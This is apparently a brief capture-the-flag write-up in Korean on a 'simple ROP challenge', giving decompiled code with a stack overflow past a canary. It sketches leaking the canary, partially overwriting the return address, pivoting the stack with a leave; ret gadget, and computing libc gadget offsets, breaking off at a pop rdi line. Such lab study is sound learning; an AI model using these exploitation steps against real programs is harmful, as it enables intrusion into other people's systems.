{
  int i; // [rsp+Ch] [rbp-B4h]
  _QWORD buf[22]; // [rsp+10h] [rbp-B0h] BYREF

  buf[21] = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  memset(buf, 0, 160);
  puts("This is simple ROP challenge");
  for ( i = 0; i <= 1; ++i )
  {
    puts("OMG BOF");
    read(0, buf, 0xBAuLL);

  }
  return 0;
}

두 번의 bof 를 일으키는데 , 카나리가 있기 때문에 우선 카나리를 leak 한다. 

0xb0 = 176; 176 -8 = 168 

0xBA = 186; 176 + 8 = 184  : ret의 하위 2바이트를 partial overwrite가능

sfp에 buf_addr, ret에 leave; ret가젯을 쓸 경우 시나리오\

→ leave; ret 에서 ret대신 leave; ret을 썼기 때문에 leave; leave; ret이 된다.

- mov rsp, rbp

- pop rbp

- mov rsp, rbp 

- pop rbp

- pop rip(ret)

—> buf_addr+8부터 값을 써야 한다.

print(hex(libc_base))

pop_rdi = libc_base + 0x10f78b
